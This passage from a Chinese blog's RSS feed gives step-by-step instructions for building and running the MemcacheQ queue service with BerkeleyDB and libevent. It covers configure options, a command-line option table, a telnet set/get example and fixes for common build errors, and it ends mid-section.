   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>/usr/local/lib&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>/usr/local/BerkeleyDB.6.0/lib&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <span style='background-color: rgb(255, 255, 255); font-family: Arial;'>新增完运行命令刷新</span> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>sudo&nbsp;ldconfig&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <br style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
 <h1 style='background-color: rgb(255, 255, 255); font-family: Arial;'><strong><span style='font-size:14px;'><span style='color:rgb(255, 0, 0);'>3.安装MemcacheQ</span></span></strong></h1> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>下载地址：<a href='https://code.google.com/p/memcacheq/downloads/list' target='_blank' style='color:rgb(202, 0, 0);'>https://code.google.com/p/memcacheq/downloads/list</a></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>创建libdb.so softlink</p> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>ln&nbsp;-s&nbsp;/usr/local/BerkeleyDB.6.0/lib/libdb-6.0.so&nbsp;/usr/lib/libdb.so&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$tar&nbsp;xvzf&nbsp;memcacheq-0.2.x.tar.gz&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$cd&nbsp;memcacheq-0.2.x&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$./configure&nbsp;--with-bdb=/usr/local/BerkeleyDB.6.0&nbsp;--with--libevent=/usr/lib&nbsp;--enable-threads&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$make&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$sudo&nbsp;make&nbsp;install&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>--with-bdb=/usr/local/BerkeleyDB.6.0 指定 Berkeley DB路径</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>--with--libevent=/usr/lib 指定 libevent 路径</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>--enable-threads 开启多线程</p> 
 <br style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
 <h1 style='background-color: rgb(255, 255, 255); font-family: Arial;'><strong><span style='font-size:14px;'><span style='color:rgb(255, 0, 0);'>4.运行与使用</span></span></strong></h1> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>参数列表：</p> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-p&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TCP监听端口(default:&nbsp;22201)&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-U&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UDP监听端口(default:&nbsp;0,&nbsp;off)&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-s&nbsp;&lt;file&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unix&nbsp;socket路径(不支持网络)&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-a&nbsp;&lt;mask&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unix&nbsp;socket访问掩码(default&nbsp;0700)&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-l&nbsp;&lt;ip_addr&gt;&nbsp;&nbsp;监听网卡&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;守护进程&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-r&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最大化核心文件限制&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-u&nbsp;&lt;username&gt;&nbsp;以用户身份运行(only&nbsp;when&nbsp;run&nbsp;as&nbsp;root)&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-c&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最大并发连接数(default&nbsp;is&nbsp;1024)&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;详细输出&nbsp;(print&nbsp;errors/warnings&nbsp;while&nbsp;in&nbsp;event&nbsp;loop)&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-vv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;更详细的输出&nbsp;(also&nbsp;print&nbsp;client&nbsp;commands/reponses)&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-i&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打印许可证信息&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-P&nbsp;&lt;file&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PID文件&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-t&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程数(default&nbsp;4)&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>--------------------BerkeleyDB&nbsp;Options-------------------------------&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-m&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BerkeleyDB内存缓存大小,&nbsp;default&nbsp;is&nbsp;64MB&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-A&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;底层页面大小,&nbsp;default&nbsp;is&nbsp;4096,&nbsp;(512B&nbsp;~&nbsp;64KB,&nbsp;power-of-two)&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-H&nbsp;&lt;dir&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据库家目录,&nbsp;default&nbsp;is&nbsp;'/data1/memcacheq'&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-L&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;日志缓冲区大小,&nbsp;default&nbsp;is&nbsp;32KB&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-C&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;多少秒checkpoint一次,&nbsp;0&nbsp;for&nbsp;disable,&nbsp;default&nbsp;is&nbsp;5&nbsp;minutes&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-T&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;多少秒memp_trickle一次,&nbsp;0&nbsp;for&nbsp;disable,&nbsp;default&nbsp;is&nbsp;30&nbsp;seconds&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-S&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;多少秒queue&nbsp;stats&nbsp;dump一次,&nbsp;0&nbsp;for&nbsp;disable,&nbsp;default&nbsp;is&nbsp;30&nbsp;seconds&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-e&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;达到缓存百分之多少需要刷新,&nbsp;default&nbsp;is&nbsp;60%&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-E&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个单一的DB文件有多少页,&nbsp;default&nbsp;is&nbsp;16*1024,&nbsp;0&nbsp;for&nbsp;disable&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-B&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定消息体的长度,单位字节,&nbsp;default&nbsp;is&nbsp;1024&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-D&nbsp;&lt;num&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;多少毫秒做一次死锁检测(deadlock&nbsp;detecting),&nbsp;0&nbsp;for&nbsp;disable,&nbsp;default&nbsp;is&nbsp;100ms&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>-N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;开启DB_TXN_NOSYNC获得巨大的性能改善,&nbsp;default&nbsp;is&nbsp;off&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>-R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自动删除不再需要的日志文件,&nbsp;default&nbsp;is&nbsp;off&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>启动MemcacheQ</p> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>memcacheq&nbsp;-d&nbsp;-r&nbsp;-H&nbsp;/data1/memcacheq&nbsp;-N&nbsp;-R&nbsp;-v&nbsp;-L&nbsp;1024&nbsp;-B&nbsp;1024&nbsp;&gt;&nbsp;/data1/mq_error.log&nbsp;2&gt;&amp;1&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>memcacheq&nbsp;-h&nbsp;查看更多设置&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[php]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color: rgb(255, 255, 255);'> 
   <li style='background-color: rgb(255, 255, 255);'>&nbsp;&nbsp;</li> 
   <li style='color: inherit; background-color: rgb(255, 255, 255);'><span style='color: black;'>?&gt;&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <br> 
</div>
 ]]></description>
	<pubDate>Wed, 08 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-206.html</guid>

</item>
<item>
	<title>MemcacheQ安装及使用</title>
	<link>http://onelose.com/post-205.html</link>
	<description><![CDATA[
 <div> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><span style='font-size:24px;'><strong>一. 安装</strong></span><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>MemcacheQ 是一个简单的分布式队列服务，它的运行依赖于BerkeleyDB 和 libevent，所以需要先安装BerkeleyDB和libevent.</p> 
 <div style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
  <h2>Berkeley DB 4.7 or later</h2> 
  <p>Download from &lt;<a href='http://www.oracle.com/database/berkeley-db/db/index.html' style='color:rgb(34, 0, 0);'>http://www.oracle.com/database/berkeley-db/db/index.html</a>&gt;</p> 
  <p>How to install BerkeleyDB:</p> 
  <pre>$tar -xvzf db-5.3.21.tar.gz
$cd db-5.3.21/
$cd build_unix/
$../dist/configure
$make
$make install

安装BerkeleyDB时，可以手动指定安装路径:<pre>../dist/configure --prefix=/usr/local/berkeleydb</pre>不指定的话，默认安装在:/usr/local/BerkeleyDB.5.3<br></pre> 
 </div> 
 <div style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
  <h2>libevent 1.4.x or later</h2> 
  <p>先检查libevent 是否已经安装:</p> 
  <p>#rpm -qa|grep libevent<br>libevent-devel-2.0.10-2.fc15.x86_64<br>libevent-2.0.10-2.fc15.x86_64<br>libevent-2.0.10-2.fc15.i686</p> 
  <p>或者：</p> 
  <p>ls -al /usr/lib |grep libevent</p> 
  <p>如果还没有安装：<br>Download from &lt;<a href='http://monkey.org/~provos/libevent/' style='color:rgb(202, 0, 0);'>http://monkey.org/~provos/libevent/</a>&gt;</p> 
  <p>How to install libevent:</p> 
  <pre>$tar -xvzf libevent-1.4.x-stable.tar.gz
$cd libevent-1.4.x-stable
$./configure
$make
$make install
</pre> 
  <pre>安装libevent时，可以手动指定安装路径:<pre>./configure --prefix=/usr/local/libevent</pre>不指定的话，默认安装在:/usr/lib64(64位系统)或者/usr/lib(32位系统)</pre> 
  <br> 
 </div> 
 <h3 style='background-color: rgb(255, 255, 255); font-family: Arial;'>memcacheQ</h3> 
 <p style='background-color: rgb(204, 204, 204); font-family: Arial;'>下载软件包：http://code.google.com/p/memcacheq/downloads/list</p> 
 <p style='background-color: rgb(204, 204, 204); font-family: Arial;'>解压缩，cd进目录</p> 
 <p style='background-color: rgb(204, 204, 204); font-family: Arial;'>./configure&nbsp;&nbsp; --enable-threads</p> 
 <p style='background-color: rgb(204, 204, 204); font-family: Arial;'>make</p> 
 <p style='background-color: rgb(204, 204, 204); font-family: Arial;'><span style='background-color: rgb(255, 204, 204);'>make install</span><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>configure 时，如果libevent 不是安装在默认目录，需--with--libevent=/usr/local/libevent指定libevent的安装目录</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>若没有将</p> 
 <pre style='background-color: rgb(255, 255, 255);'>/usr/local/lib
/usr/local/BerkeleyDB.5.3/lib
添加进/etc/ld.so.conf 并运行 /sbin/ldconfig 则需--with-bdb=/usr/local/BerkeleyDB.5.3 指定berkeleyDb库的路径
</pre> 
 <br style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><span style='font-size:24px;'><strong>二.使用</strong></span></p> 
 <h3 style='background-color: rgb(255, 255, 255); font-family: Arial;'>启动memcacheQ</h3> 
 <ol style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
  <li>使用memcacheq -h 的命令来查看命令行选项</li> 
  <li>启动memcacheq：memcacheq -d -u nobody -r -H /tmp/memcacheq -N -R -v -L 1024 -B 1024 &gt; /tmp/mq_error.log 2&gt;&amp;1</li> 
 </ol> 
 <span style='background-color: rgb(255, 255, 255); font-family: Arial;'>启动时需-u 参数，指定运行memcacheQ的用户，且指定的用户必须有数据文件的读写权限,如这里的/tmp/memcacheQ目录,否则不能启动</span> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><span style='font-size:12px;'><strong>命令行使用memcacheQ</strong></span></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><span style='font-size:12px;'>telnet 127.0.0.1 22202</span></p> 
 <div style='background-color: rgb(255, 255, 255); font-family: Arial;'>
   Trying 127.0.0.1… 
 </div> 
 <div style='background-color: rgb(255, 255, 255); font-family: Arial;'>
   Connected to 127.0.0.1. 
 </div> 
 <div style='background-color: rgb(255, 255, 255); font-family: Arial;'>
   Escape character is ‘^]’. 
 </div> 
 <strong style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></strong> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>只有两个命令可以在命令行下使用memcacheQ</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>写对列：<br></p> 
 <pre style='background-color: rgb(255, 255, 255);'>set &lt;queue name&gt; &lt;flags&gt; 0 &lt;message_len&gt;\r\n
&lt;put your message body here&gt;\r\n
STORED\r\n</pre> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>取出队列：</p> 
 <pre style='background-color: rgb(255, 255, 255);'>get &lt;queue name&gt;\r\n
VALUE &lt;queue name&gt; &lt;flags&gt; &lt;message_len&gt;\r\n
&lt;your message body will come here&gt;\r\n
END\r\n
</pre> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>与memcache协议基本一致，只是把key name换成queue name，而且在set的命令中，忽略了expire_time的参数。mq的数据存储是存在berkeleyDB中，做了持久化存储，没有内存的过期时间。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>示例：</p> 
 <blockquote style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
  <div>
    &nbsp;telnet 127.0.0.1 22202 
  </div> 
  <div>
    Trying 127.0.0.1… 
  </div> 
  <div>
    Connected to 127.0.0.1. 
  </div> 
  <div>
    Escape character is ‘^]’. 
  </div> 
  <div> 
   <span style='color:rgb(51, 153, 102);'>set q4 0 0 5</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 153, 102);'>hello</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 153, 102);'>STORED</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 153, 102);'>set q4 0 0 5</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 153, 102);'>world</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 153, 102);'>STORED</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 102, 255);'>stats queue</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 102, 255);'>STAT q4 2/0</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 102, 255);'>END</span> 
  </div> 
  <div> 
   <span style='color:rgb(255, 102, 0);'>get q4</span> 
  </div> 
  <div> 
   <span style='color:rgb(255, 102, 0);'>VALUE q4 0 5</span> 
  </div> 
  <div> 
   <span style='color:rgb(255, 102, 0);'>hello</span> 
  </div> 
  <div> 
   <span style='color:rgb(255, 102, 0);'>END</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 102, 255);'>stats queue</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 102, 255);'>STAT q4 2/1</span> 
  </div> 
  <div> 
   <span style='color:rgb(51, 102, 255);'>END</span> 
  </div> 
 </blockquote> 
 <span style='background-color: rgb(255, 255, 255); font-family: Arial; font-size: 18px;'><strong>三.安装使用过程中可能出现的错误</strong></span> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>1.编译出现错误：checking for library containing db_create... no<br>configure: error: cannot find libdb.so in /usr/local/BerkeleyDB.5.3/lib<br>需要修改 configure 中的BerkeleyDB中的预编译参数vim configure找到bdbdir='/usr/local/berkeleydb'改为<br>bdbdir='/usr/local/BerkeleyDB.5.3'再次编译</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>2.configure: error: cannot find libdb.so in /usr/local/BerkeleyDB.5.3/lib</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>出现此错误的原因在于没有安装BerkyleyDb,安装即可</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>3./usr/local/memcacheq/bin/memcachq -h<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;运行报：<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;memcacheq: error while loading shared libraries: libdb-5.3.so: cannot open shared object file: No such file or directory<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;解决方法：ln -s /usr/local/BerkeleyDB.5.3/lib/libdb-5.3.so /usr/lib/libdb-5.3.so</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><span style='color:rgb(255, 0, 0);'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注：在64位操作系统中，需执行</span></p> 
